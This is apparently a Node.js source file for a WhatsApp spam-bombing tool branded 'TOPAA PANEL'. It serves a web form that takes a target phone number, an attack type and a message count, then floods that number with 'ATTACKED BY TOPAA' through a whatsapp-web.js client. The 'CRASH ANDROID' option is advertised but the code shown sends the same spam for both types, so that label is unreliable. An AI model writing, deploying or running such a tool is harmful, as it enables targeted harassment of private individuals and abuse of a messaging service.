const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const port = process.env.PORT || 3000;

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    }
});

client.on('qr', (qr) => {
    console.log('SCAN QR DI LOG RAILWAY:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('WA-BOT ONLINE!');
});

app.get('/', (req, res) => {
    res.send(`
        <head>
            <title>TOPAA SCRIPTS</title>
            <style>
                body { background: #0a0a0a; color: #ff0055; font-family: sans-serif; text-align: center; padding: 50px; }
                .panel { border: 2px solid #ff0055; display: inline-block; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #ff0055; }
                input, select, button { width: 100%; margin: 10px 0; padding: 10px; border-radius: 5px; border: none; }
                button { background: #ff0055; color: white; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="panel">
                <h1>TOPAA PANEL</h1>
                <form action="/attack" method="POST">
                    <input type="text" name="number" placeholder="628xxxx" required>
                    <select name="type">
                        <option value="spam">FAST SPAM</option>
                        <option value="crash">CRASH ANDROID</option>
                    </select>
                    <input type="number" name="count" placeholder="Jumlah" required>
                    <button type="submit">EXECUTE ATTACK!</button>
                </form>
            </div>
        </body>
    `);
});

app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    let text = "🔥 ATTACKED BY TOPAA 🔥"; // NAMA SUDAH DIGANTI

    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            await new Promise(r => setTimeout(r, 1000));
        } catch (e) { console.log(e); }
    }
    res.send('SUKSES! <a href="/">Kembali</a>');
});

app.listen(port, '0.0.0.0', () => {
    console.log('Server running on port ' + port);
});
client.initialize();
